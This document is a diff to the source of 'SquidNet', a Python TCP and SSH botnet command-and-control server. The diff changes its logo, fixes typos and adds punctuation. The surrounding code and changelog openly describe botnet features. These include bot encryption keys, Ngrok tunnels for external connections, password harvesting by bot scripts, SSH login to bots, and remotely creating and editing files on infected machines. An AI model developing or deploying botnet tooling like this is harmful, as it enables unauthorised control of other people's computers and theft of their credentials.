@@ -1,6 +1,7 @@
 import urllib.request, random, socket, time, sys, threading, random, os, hashlib, datetime
 from cryptography.fernet import Fernet
 from optparse import OptionParser
+
 class ArguementParse:
     def __init__(self):
         """If there are less than 2 arguements the option-parsing
@@ -57,7 +58,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid
 [+] --eK, --encryptkey - Specify encrypting key for bots.
 [+] --nH, --ngrokhost  - Specify an Ngrok Hostname for external connections.
 [+] --nP, --ngrokport  - Specify an Ngrok Port for external connections.
-[+] Note: You need to have an Ngrok domain started for the ngrok arguements to have affect.
+[+] Note: You need to have an Ngrok domain started for the ngrok arguements to have effect.
 
 [+] Usage:""")
         if sys.argv[0].endswith(".py"):
@@ -205,28 +206,19 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _           _  _   _____ 
- / ____|           (_)   | | \ | |    | |         | || | | ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| || |_| |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /__   _|___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /   | |_ ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/    |_(_)____/ 
-           | |                                                  
-           |_|                                                                                         
+  _____             _     _ _   _      _           _____  ___  
+ / ____|           (_)   | | \ | |    | |         | ____|/ _ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| |__ | | | |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /___ \| | | |
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V / ___) | |_| |
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/ |____(_)___/ 
+           | |                                                 
+           |_|                                                                                       
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
-        """Logo of this script."""
-        print("""
-  _____             _     _ _   _      _           _  _   _____ 
- / ____|           (_)   | | \ | |    | |         | || | | ____|
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   _| || |_| |__  
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / /__   _|___ \ 
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V /   | |_ ___) |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_/    |_(_)____/ 
-           | |                                                  
-           |_|                                                  
-TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
+        """Prints the logo of this script."""
+        print(self.log_logo())
     def usage(self):
         """This displays the list of commands on the server that can be sent to the bots."""
         print("\n[+] Commands:\n")
@@ -770,12 +762,10 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid""")
                     print("""
 [+] New Features In the SquidNet:
 
-[+] - Added Whatsnew Command.
-[+] - Added SSH Login command(can provide password)
-[+] - Added Password Obtaining on the Bot Scripts
-[+] - Fixed Typo in What's new in section 3.
+[+] - Fixed Typo in Option-Parsing Message(affect-->effect).
 [+] - Added Bot file editing.
 [+] - Added Bot file creation.
+[+] - Optimized the code a little.
                     """)
                 if self.instruction != "!clear":
                     self.send_ssh(self.instruction)
@@ -4543,7 +4533,7 @@ OS:       {sys.platform}
                     self.editfile.close()
                     self.filename = self.editfile.name
                     self.fileeditor = True
-                    self.send(f"File editing mode activated for file {self.filename}")
+                    self.send(f"File editing mode activated for file {self.filename}.")
                 except:
                     self.send("File cannot be opened on this computer.".encode())
                     self.fileeditor = False
@@ -4553,7 +4543,7 @@ OS:       {sys.platform}
                     filename = msg_split[1]
                     file = open(str(filename),"w")
                     file.close()
-                    self.send(f"File {filename} has been created in {os.getcwd()}".encode())
+                    self.send(f"File {filename} has been created in {os.getcwd()}.".encode())
                 except:
                     self.send("Error with creating files.".encode())
             else:
